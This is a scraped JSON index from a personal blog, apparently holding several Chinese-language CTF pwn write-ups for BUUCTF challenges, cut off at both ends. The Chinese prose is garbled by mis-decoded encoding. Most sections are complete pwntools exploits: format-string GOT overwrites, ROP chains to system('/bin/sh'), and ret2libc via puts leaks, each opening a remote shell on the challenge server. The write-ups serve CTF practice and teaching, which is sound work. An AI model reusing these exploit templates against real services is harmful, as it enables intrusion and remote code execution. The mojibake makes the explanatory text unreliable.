bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... format_payload = b\u0026#34;%151$p\u0026#34; sendline_after_clean(format_payload) libcbase = recv_and_transform(\u0026#34;:\u0026#34;, False, False, \u0026#34;\\n\u0026#34;) - 247 - libc.sym[\u0026#39;__libc_start_main\u0026#39;] system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libcbase + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) one_gadget = libcbase + 0x3a80e suclog( libcbase=libcbase, system_addr=system_addr, binsh_addr=binsh_addr ) format_payload = b\u0026#34;a\u0026#34; + fmtstr_payload(8, {m_elf.got[\u0026#39;printf\u0026#39;]:one_gadget}, 10) sendline_after_clean(format_payload, no_show=False) sendline_after_clean(b\u0026#34;/bin/sh\u0026#34;) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/fmtstr_payload%E5%87%BD%E6%95%B0buuctf-axb_2019_fmt32/","section":"writeup","summary":"æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬gdbåˆ°printf(format);é‚£é‡Œçœ‹ä¸‹æ ˆï¼š å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šå‚¨å­˜è¦å…ˆåæ‰ä¸€ä¸ªå­—ç¬¦æ‰","tags":["pwn","fmtstr_payloadå‡½æ•°","æ ¼å¼åŒ–å­—ç¬¦ä¸²"],"title":"ã€fmtstr_payloadå‡½æ•°ã€‘BUUCTF axb_2019_fmt32"},{"categories":["writeup"],"contents":"ã€Write-upã€‘BUUCTF ã€HarekazeCTF2019ã€‘baby_rop åŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF ã€HarekazeCTF2019ã€‘baby_rop checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  gdb è°ƒè¯• æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file babyrop [*] \u0026#39;/home/peterl/security/workspace/babyrop/babyrop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 ä½ç¨‹åºï¼Œä¸èƒ½ä½¿ç”¨ shellcode\nida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æœ‰ scanfï¼Œæœ‰ printfï¼Œçœ‹èµ·æ¥å¯èƒ½æ˜¯æ™®é€šçš„æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹\næ­¤é¢˜ç”¨ä¸äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬æ§åˆ¶ä¸äº† format å­—ç¬¦ä¸²ï¼Œåªèƒ½æ§åˆ¶åé¢è·Ÿçš„ argsï¼Œè€Œ printf åªä¼šå¯¹ format å­—ç¬¦ä¸²ä½œè§£æ\ngdb è°ƒè¯• è¿™é¢˜æ¯”è¾ƒå‘çš„æ˜¯ç¬¬ä¸€æ¡è¾“å‡ºè¯­å¥æ˜¯systemå‡½æ•°è¾“å‡ºçš„ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ gdb è°ƒè¯•ä¹‹å‰å°±è¦åŠ ä¸€å¥set follow-fork-mode parentï¼Œè¿™æ¡å‘½ä»¤å°†è°ƒè¯•è¿½è¸ªå›ºå®šåœ¨çˆ¶ç¨‹åºä¸Šï¼Œä¸è®©ä»–è·‘å»è¿½è¸ªå­ç¨‹åº\næˆ‘ä»¬é€šè¿‡ ida æ‰¾åˆ°call _printfçš„åœ°å€ï¼Œä½¿ç”¨b* 0x40060Fæ‰“ä¸ªæ–­ç‚¹ï¼Œè¿™æ—¶å€™å¦‚æœç›´æ¥ run å°±éœ€è¦è¾“å…¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆcyclic 50ä¸€ä¸ªè§„å¾‹å­—ç¬¦ä¸²ç”¨ä»¥è¾“å…¥\npwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama ç„¶åç›´æ¥r\nç„¶åæˆ‘ä»¬çœ‹åˆ°æ ˆæƒ…å†µæ˜¯è¿™æ ·çš„ï¼š\n00:0000â”‚ rsi rsp 0x7fffffffd770 â—‚â€” \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 01:0008â”‚ 0x7fffffffd778 â—‚â€” \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 02:0010â”‚ rbp 0x7fffffffd780 â—‚â€” \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:0018â”‚ 0x7fffffffd788 â—‚â€” \u0026#39;gaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0020â”‚ 0x7fffffffd790 â—‚â€” \u0026#39;iaaajaaakaaalaaama\u0026#39; 05:0028â”‚ 0x7fffffffd798 â—‚â€” \u0026#39;kaaalaaama\u0026#39; 06:0030â”‚ 0x7fffffffd7a0 â—‚â€” 0x1ff00616d /* \u0026#39;ma\u0026#39; */ ä½œè€…æ­¤æ—¶å¿ƒä¸­ä¸€å–œï¼Œè¿æŒ‰nç»§ç»­åˆ°retæŒ‡ä»¤ï¼Œçœ‹ä¸€çœ‹æ­¤æ—¶rspæ ˆé¡¶æŒ‡é’ˆæŒ‡å‘å“ªé‡Œ\næˆ‘ä»¬å‘ç° return å€¼å¯ä»¥è¢«æˆ‘ä»¬æ ˆæº¢å‡ºæ‰ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨cyclic -l gaaaæ¥çœ‹ä¸€çœ‹åç§»é‡æ˜¯å¤šå°‘ï¼š\npwndbg\u0026gt; cyclic -l gaaa 24 åŒæ—¶å½“å‰ç¨‹åº plt è¡¨ä¸­è‚¯å®šæœ‰systemï¼ˆå‰é¢è°ƒç”¨è¿‡ï¼‰ï¼Œæˆ‘ä»¬åªéœ€è¦/bin/shæˆ–è€…shå°±èƒ½æ„å»º exp äº†ï¼\næ„å»º exp åœ¨ ida ä¸­æ‰¾åˆ°systemçš„åœ°å€ï¼š\nROPgadgetå¯»æ‰¾/bin/shï¼š\n$ ROPgadget --binary babyrop --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000601048 : /bin/sh ROPgadgetå¯»æ‰¾pop rdi;retå’Œretï¼š\n$ ROPgadget --binary babyrop --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400683 : pop rdi ; ret ... 0x0000000000400479 : ret ... é‚£ä¹ˆæˆ‘ä»¬çš„ payload å°±å‡ºæ¥äº†ï¼š\npop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) å®Œæ•´ exp from pwn import * from pwn import p64, p32, u32, u64 import pwnlib # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyrop\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28069\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x40060F\u0026#34;) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) pop_rdi:int = 0x400683 ret: int = 0x400479 sys:int = 0x400490 bin_sh: int = 0x601048 p.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) payload = b\u0026#34;aaaabaaacaaadaaaeaaafaaa\u0026#34; + pg(ret) + pg(pop_rdi) + pg(bin_sh) + pg(sys) p.sendline(payload) # p.recvuntil(\u0026#34;!\\n\u0026#34;) p.interactive() æ­¤é¢˜è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå‘çš„ç‚¹ï¼Œå®ƒçš„ flag å¹¶ä¸æ˜¯æ”¾åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ­¤é¢˜ flag çš„ä½ç½®åœ¨/home/babyropå†…ï¼Œå¯ä»¥é€šè¿‡find -name flagæŸ¥æ‰¾ä½ç½®ï¼ˆåŠ¨ä½œå¿«ä¸€ç‚¹ï¼Œæœ‰æ—¶é—´é™åˆ¶ï¼‰\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/harekazectf2019baby_rop/","section":"writeup","summary":"ã€Write-upã€‘BUUCTF ã€HarekazeCTF2019ã€‘baby_rop åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF ã€HarekazeCTF20","tags":["pwn"],"title":"ã€HarekazeCTF2019ã€‘baby_rop"},{"categories":["writeup"],"contents":"ã€Write-upã€‘BUUCTF ciscn_2019_en_2 åŸé¢˜é“¾æ¥å’Œè¿™é“é¢˜æ˜¯ä¸€é“é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„\nã€Write-upã€‘BUUCTF ciscn_2019_en_2 checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_en_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 ä½ç¨‹åºï¼Œä¸èƒ½ç”¨ shellcode\nå†ç”¨readelfå‘½ä»¤çœ‹ä¸€ä¸‹ï¼š\n$ readelf -r ciscn_2019_en_2 é‡å®šä½èŠ‚ \u0026#39;.rela.dyn\u0026#39; at offset 0x538 contains 4 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° + åŠ æ•° 000000601ff8 000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000602080 000d00000005 R_X86_64_COPY 0000000000602080 stdout@GLIBC_2.2.5 + 0 000000602090 000e00000005 R_X86_64_COPY 0000000000602090 stdin@GLIBC_2.2.5 + 0 0000006020a0 000f00000005 R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0 é‡å®šä½èŠ‚ \u0026#39;.rela.plt\u0026#39; at offset 0x598 contains 11 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° + åŠ æ•° 000000602018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0 000000602020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000602028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000602030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0 000000602038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000602040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 getchar@GLIBC_2.2.5 + 0 000000602048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0 000000602050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0 000000602058 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fflush@GLIBC_2.2.5 + 0 000000602060 000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0 000000602068 000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 å‘ç°æ²¡æœ‰systemï¼Œå¯èƒ½å°±æ˜¯ ret2libc äº†\nida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(\u0026#34;EEEEEEE hh iii \u0026#34;); puts(\u0026#34;EE mm mm mmmm aa aa cccc hh nn nnn eee \u0026#34;); puts(\u0026#34;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e \u0026#34;); puts(\u0026#34;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;====================================================================\u0026#34;); puts(\u0026#34;Welcome to this Encryption machine\\n\u0026#34;); begin(); while ( 1 ) { while ( 1 ) { fflush(0LL); v4 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); if ( v4 != 2 ) break; puts(\u0026#34;I think you can do it by yourself\u0026#34;); begin(); } if ( v4 == 3 ) { puts(\u0026#34;Bye!\u0026#34;); return 0; } if ( v4 != 1 ) break; encrypt(); begin(); } puts(\u0026#34;Something Wrong!\u0026#34;); return 0; } è¿™ä¸€å¤§å †æ‚ä¹±çš„ä»£ç æˆ‘ä»¬èŠ±ä¸€ç‚¹æ—¶é—´å»åˆ†æå°±ä¼šå‘ç°ï¼Œåªæœ‰å½“ç¬¬ä¸€æ¬¡è¾“å…¥çš„é€‰é¡¹æ˜¯ 1 çš„æ—¶å€™ï¼Œæ‰ä¼šè¿›å…¥encryptå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ä¼ª C ä»£ç ä¸ºï¼š\nint encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 \u0026gt;= strlen(s) ) break; if ( s[x] \u0026lt;= 96 || s[x] \u0026gt; 122 ) { if ( s[x] \u0026lt;= 64 || s[x] \u0026gt; 90 ) { if ( s[x] \u0026gt; 47 \u0026amp;\u0026amp; s[x] \u0026lt;= 57 ) s[x] ^= 0xCu; } else { s[x] ^= 0xDu; } } else { s[x] ^= 0xEu; } ++x; } puts(\u0026#34;Ciphertext\u0026#34;); return puts(s); } è¿™ä»£ç ä¹Ÿæ˜¯ä¹±å¾—ä¸å¾—äº†ï¼Œå’Œç¥ç»ç—…å‘ç™«ä¸€æ ·ã€‚ä½†æ˜¯å…¶å®é‚£ä¸€å¤§ä¸²whileé‡Œé¢çš„ä»£ç éƒ½å¯ä»¥é€šè¿‡è¿™ä¸€å¥æ¥è·³è¿‡å»ï¼š\nv0 = (unsigned int)x; // v0 \u0026gt;= 0 if ( v0 \u0026gt;= strlen(s) ) break; å¦‚æœæˆ‘ä»¬è®©sçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º\\0çš„è¯ï¼Œé‚£ä¹ˆå®ƒstrlenåçš„å€¼å°±å§‹ç»ˆä¸º 0ï¼Œv0å§‹ç»ˆå¤§äºç­‰äºsçš„é•¿åº¦ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥è·³å‡ºå¾ªç¯ï¼Œä¸ç”¨è¿›è¡Œä¸‹é¢é‚£ä¸€å¤§ä¸²æ“ä½œã€‚\næˆ‘ä»¬åˆçœ‹åˆ°è¾“å…¥å‡½æ•°ä¸ºgetsï¼Œè¿™è¯´æ˜å¯ä»¥æ ˆæº¢å‡ºï¼ŒåŒæ—¶ç¨‹åºåˆæœ‰putså‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°libcçš„åŸºå€ï¼Œä»è€Œè®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€\næ„å»º exp å…ˆæŠŠretå’Œpop rdi;retè¿™ä¸¤ä¸ª gadget å‡†å¤‡å¥½ï¼š\n$ ROPgadget --binary ciscn_2019_en_2 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400c83 : pop rdi ; ret ... 0x00000000004006b9 : ret ... ä¹Ÿå¯ä»¥é€šè¿‡ pwntools çš„å†…ç½®å‡½æ•°å¾—åˆ°ï¼š\nrop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] puts çš„ plt å’Œ got åœ°å€ã€main çš„åœ°å€åŒç†ï¼š\nputs_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] ç„¶åæˆ‘ä»¬å¯ä»¥æ„å»ºç¬¬ä¸€ä¸ª payload äº†ï¼š\n# offset:int = 0x58ï¼Œå¯ä»¥ç”±gdbæˆ–è€…idaå¾—çŸ¥ payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) ç„¶åæˆ‘ä»¬å°±èƒ½å¾—åˆ°putsçš„çœŸå®åœ°å€äº†ï¼š\np.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) # è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè°ƒè¯•åå‘ç°å¤šäº†ä¸€ä¸ª0aï¼Œè¦æŠŠå®ƒåæ‰ p.recv(1) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) ä¸ºäº†é¿å…å„ç§ç‰ˆæœ¬çš„ libc å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ LibcSearcherï¼š\n# è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # æ‰‹åŠ¨é€‰æ‹©ç¬¬0å·æœç´¢åˆ°çš„libc # å¦‚æœä½ é€‰æ‹©0å·ä¸è¡Œï¼Œä¹Ÿå¯ä»¥æŠŠè¿™è¡Œæ³¨é‡Šæ‰ï¼Œè¿è¡Œä¸­å†é€‰æ‹© searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) åŸç‰ˆ LibcSearcher å·²ç»å¹´ä¹…å¤±ä¿®ï¼Œè€Œä¸”åŸºäºæœ¬åœ° libc åº“ï¼Œå‡ ä¹å®Œå…¨ä¸å¯ç”¨ï¼ŒGitHub ä¸Šæœ‰å¾ˆå¤šæ–°ç‰ˆ LibcSearcherï¼Œæˆ‘é€‰æ‹©äº†è¿™ä¸ªä½¿ç”¨äº‘ç«¯ libc åº“çš„é¡¹ç›®\nä½œè€…ä¸ºäº†ä½¿ç”¨æ­£ç¡®çš„ libc ç”šè‡³é‡æ–°æ­äº†ä¸€ä¸ª ubuntu18.04 çš„è™šæ‹Ÿæœºç¯å¢ƒï¼Œä½†æ˜¯åœ¨å‡ ä¸ªå°æ—¶çš„å¿™ç¢Œåå‘ç° libc ç‰ˆæœ¬è¿˜æ˜¯ä¸å¯¹ï¼Œäºæ˜¯è½¬è€Œé€‰æ‹© LibcSearcherï¼Œä¸å¾—ä¸è¯´ï¼Œæ˜¯çœŸ**çš„å¥½ç”¨ï¼Œæ„Ÿè°¢åŸä½œè€…å’Œåç»­æ— ç§å¥‰çŒ®çš„å¼€å‘è€…ï¼\nç„¶åæˆ‘ä»¬å¯ä»¥æ„å»º payload äº†ï¼š\npayload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) å®Œæ•´ exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_en_2\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;29058\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) # æŸ¥æ‰¾gadgetçš„å†…ç½®å‡½æ•° if not if_32: rop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] success(f\u0026#34;pop_rdi:{hex(pop_rdi)}\u0026#34;) success(f\u0026#34;ret:{hex(ret)}\u0026#34;) else: pop_rdi:int = 0 ret:int = 0 #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x58 # éœ€è¦æ”¹ä¸ºéœ€è¦çš„è¾“å…¥å‡½æ•°ï¼Œé»˜è®¤ä¸ºputs puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) success(f\u0026#34;main_addr:{hex(main_addr)}\u0026#34;) # å‘é€payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(puts_plt) + pg(main_addr) + pg(0) + pg(puts_got) p.sendline(payload) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u32(p.recv(4)) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.recv(1) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) # è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) success(f\u0026#34;base_addr:{hex(base_addr)}\u0026#34;) success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;bin_sh_addr:{hex(bin_sh_addr)}\u0026#34;) # å‘é€payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(system_addr) + pg(0) + pg(bin_sh_addr) p.sendline(payload) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) p.sendline(payload) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/","section":"writeup","summary":"ã€Write-upã€‘BUUCTF ciscn_2019_en_2 åŸé¢˜é“¾æ¥å’Œè¿™é“é¢˜æ˜¯ä¸€é“é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„ ã€Write-upã€‘BUUCTF ciscn_2019_en_2 checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥","tags":["pwn","LibSearcher"],"title":"ã€LibSearcherã€‘ciscn_2019_en_2"},{"categories":["writeup"],"contents":"\u0026ldquo;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 åŸé¢˜é“¾æ¥\n\u0026quot;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file not_the_same_3dsctf_2016 [*] \u0026#39;/home/peterl/security/workspace/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32ä½ç¨‹åºå¸¦å †é˜²æŠ¤\nåŒæ—¶ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ lddå‘½ä»¤ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªé™æ€é“¾æ¥ç¨‹åº\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ä¸»å‡½æ•°å¾ˆç®€å•å°±èƒ½æ ˆæº¢å‡ºï¼Œé‚£æˆ‘ä»¬å†æ‰¾æ‰¾æœ‰æ²¡æœ‰åé—¨å‡½æ•°\nç»“æœå‘ç°äº†get_secretå‡½æ•°ï¼š\næˆ‘ä»¬å‘ç°è¿™ä¸ªåé—¨å‡½æ•°å®åœ¨æœ‰ç‚¹ç‰¹æ®Šï¼Œä¸»è¦é€»è¾‘æ˜¯æ‰“å¼€ç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶ï¼Œç„¶åè¯»å…¥å¼€å¤´çš„è‡³å¤š45ä¸ªå­—ç¬¦å…¥fl4gå˜é‡ï¼Œæˆ‘ä»¬åŒå‡»fl4gå˜é‡å‘ç°å…¶åœ°å€ä¸ºï¼š\næ„å»ºexp æˆ‘ä»¬ä½¿ç”¨readelf -så‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ç¬¦å·è¡¨ï¼š\n$ readelf -s not_the_same_3dsctf_2016 | grep fl4g 1506: 080eca2d 45 OBJECT GLOBAL DEFAULT 24 fl4g $ readelf -s not_the_same_3dsctf_2016 | grep printf ... 901: 0804f0a0 30 FUNC GLOBAL DEFAULT 5 printf ... é‚£ä¹ˆæˆ‘ä»¬çš„åŸºæœ¬æ€è·¯å°±æ˜¯ï¼Œå…ˆæ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°ï¼Œç„¶åè°ƒç”¨è¾“å‡ºå‡½æ•°printfè¾“å‡ºfl4g\npayload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) æ³¨æ„ï¼Œè¿™é‡Œä¸€å®šè¦ä½¿ç”¨exité€€å‡ºï¼Œè¿™é‡Œçš„exitèµ·äº†ä¸€ä¸ªreturnè¯­å¥çš„ä½œç”¨\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./not_the_same_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;28534\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x8048A00\u0026#34;) else: p = process(fn) m_elf = ELF(fn) backdoor = 0x80489a0 p.clean() # è¿™é‡Œä¸èƒ½ç›´æ¥recvuntilï¼Œå› ä¸ºprintfä¸åˆ·æ–°ç¼“å†²åŒºï¼Œpwntoolsè¿™ç§ç”¨ç®¡é“çš„å·¥å…·æ— æ³•æ¥æ”¶åˆ°ä»»ä½•å­—ç¬¦ # p.recvuntil(\u0026#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... \u0026#34;) payload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + 